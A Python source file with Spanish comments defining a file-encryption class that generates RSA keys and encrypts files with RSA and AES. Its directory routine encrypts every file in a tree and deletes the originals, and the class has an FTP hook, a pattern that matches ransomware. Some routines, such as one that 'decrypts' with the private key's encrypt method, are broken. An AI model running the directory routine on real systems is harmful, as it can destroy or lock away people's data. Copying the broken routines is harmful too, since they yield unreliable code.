#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from FTP import TeFTP

class TeKrypto():
	
	######################################################################################
	#
	# Inicializa la clase y el objeto keys
	#
	#
	##
	
	def __init__(self):

		self.keys_path = "keys/"
		self.keys = {'private': '', 'public': ''}
		
	######################################################################################
	#
	# Generar las llaves RSA
	#
	# Args:
	#    priv_key (str): El nombre de la llave privada sin extensión.
	#    pub_key  (str): El nombre de la llave pública sin extensión.
	#	 size	  (int): El tamaño de la llave (2048, 3072, 4096) bits.
	#
	#	Returns:
	#		bool: The return value. True for success, False otherwise.
	##
	
	def generaLLaves(self, priv_key, pub_key, size):

		# Llave privada
		llave = RSA.generate(size)
		llave_privada = llave.export_key('PEM')

		# Guarda archivo/llave PEM privada
		self.keys['private'] = self.keys_path + priv_key + '.pem'
		self.guardaLlave(self.keys['private'], llave_privada)
		
		# Llave pública
		llave_publica = llave.publickey().exportKey('PEM')

		# Guarda archivo/llave PEM pública
		self.keys['public'] = self.keys_path + pub_key + '.pem'
		self.guardaLlave(self.keys['public'], llave_publica)

		print("Se generararon las llaves:", self.keys)

	######################################################################################
	#
	# Función para encriptar archivo
	#
	# Args:
	#    archivo (str): El nombre del archivo donde se guardará la llave
	#    llave  (str): La llave
	##
	
	def guardaLlave(self, archivo, llave):

		file = open(archivo,"wb") 
		file.write(llave)
		file.close()

	######################################################################################
	#
	# Setea la llave pública para encriptar
	#
	# Args:
	#    nombre_llave (str): El nombre de la llave pública
	#    tipo  (str): publica/privada
	##

	def usaLlave(self, nombre_llave, tipo):
		self.keys[tipo] = self.keys_path + nombre_llave
		
	######################################################################################
	#
	# Encriptar archivo
	#
	# Args:
	#    archivo (str): El nombre del archivo a encriptar
	#	 preserva (bool) : Si machaca original o guarda nuevo
	##

	def encriptaArchivo(self, archivo, preserva):
                
		rsa_public_key = RSA.importKey(open(self.keys['public']).read())
		self.rsa_public_key = PKCS1_OAEP.new(rsa_public_key)
		
		contenido = self.leeArchivo(archivo)

		if not preserva:
			archivo = archivo + ".crypt"

		session_key = get_random_bytes(16)
		enc_session_key = self.rsa_public_key.encrypt(session_key)
		
		cipher_aes = AES.new(session_key, AES.MODE_EAX)

		self.guardaArchivoEncriptado(archivo, contenido, enc_session_key, cipher_aes)

	######################################################################################
	#
	# Desencriptar archivo
	#
	# Args:
	#    archivo (str): El nombre del archivo a encriptar
	#	 preserva (bool) : Si machaca original o guarda nuevo
	##
	
	def desencriptaArchivo(self, archivo, preserva):
		
		#contenido = self.leeArchivo(archivo)
		contenido = open(archivo, "rb")

		rsa_private_key = RSA.importKey(open(self.keys['private']).read())
		self.rsa_private_key = PKCS1_OAEP.new(rsa_private_key)
		
		enc_session_key, nonce, tag, ciphertext = \
			[ contenido.read(x) for x in (rsa_private_key.size_in_bytes(), 16, 16, -1) ]

		if not preserva:
			os.remove(archivo)
			archivo = os.path.splitext(archivo)[0]
			

		
		# Decrypt the session key with the private RSA key
		session_key = self.rsa_private_key.decrypt(enc_session_key)
		
		# Decrypt the data with the AES session key
		cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
		data = cipher_aes.decrypt_and_verify(ciphertext, tag)
		file_out = open(archivo, "wb")
		file_out.write(data)

	######################################################################################
	#
	# Encripta directorio
	#
	# Args:
	#    direcotrio (str): El nombre del directorio a encriptar
	#	 preserva (bool) : Si machaca original o guarda nuevo
	##
		
	def encriptaDirectorio(self, directorio, preserva):

		rootdir = directorio

		for folder, subs, files in os.walk(rootdir):
			with open(os.path.join('logs/python-outfile.txt'), 'w') as dest:
				for filename in files:
					self.encriptaArchivo(folder + "/" + filename, False)
					dest.write(folder + filename  + '\n')
					os.remove(folder + "/" + filename)
	######################################################################################
	#
	# Desncripta directorio
	#
	# Args:
	#    direcotrio (str): El nombre del directorio a encriptar
	#	 preserva (bool) : Si machaca original o guarda nuevo
	##
		
	def desencriptaDirectorio(self, directorio, preserva):

		rootdir = directorio

		for folder, subs, files in os.walk(rootdir):
			with open(os.path.join('logs/python-outfile.txt'), 'w') as dest:
				for filename in files:
					#kk
					if(folder + "/" + filename != folder + "/" + 'python-outfile.txt'):
						self.desencriptaArchivo(folder + "/" + filename, False)
						dest.write(folder + filename  + '\n')
					
	######################################################################################
	#
	# Lee contenido archivo
	#
	# Args:
	#    archivo (str): El nombre del archivo  a leer
	#
	# Returns:
	#	 arcvhio binario contents
	##
										
	def leeArchivo(self, archivo):
		
		file = open(archivo, "rb") 
		contenido = file.read()
		file.close()
		return contenido

	######################################################################################
	#
	# Encripta y Guarda el Arcvhivo encriptado
	#
	# Args:
	#    archivo (str): El nombre del archivo  final encriptado
	#    contenido (binary): Contenido de archivo a encriptar
	#    enc_session_key (int): La session del proceso  de encriptamiento
	#    cipher_aes: El cipher AES
	#
	##
	
	def guardaArchivoEncriptado(self, archivo, contenido, enc_session_key, cipher_aes):
		
		file= archivo
		file_out = open(archivo, "wb")
		
		ciphertext, tag = cipher_aes.encrypt_and_digest(contenido)
		[ file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]

			
	######################################################################################
	#
	# Desencripta y Guarda el Arcvhivo desencriptado
	#
	# Args:
	#    archivo (str): El nombre del archivo  final encriptado
	#    contenido (binary): Contenido de archivo a encriptar
	#    enc_session_key (int): La session del proceso  de encriptamiento
	#    cipher_aes: El cipher AES
	#
	##
	
	def guardaArchivoDesencriptado(self, archivo, contenido):
		
		file= archivo
		with open(file, 'wb') as filetowrite:
			filetowrite.write(self.rsa_private_key.encrypt(contenido))

	def ftp(self, directorio):
		return TeFTP(directorio)
			
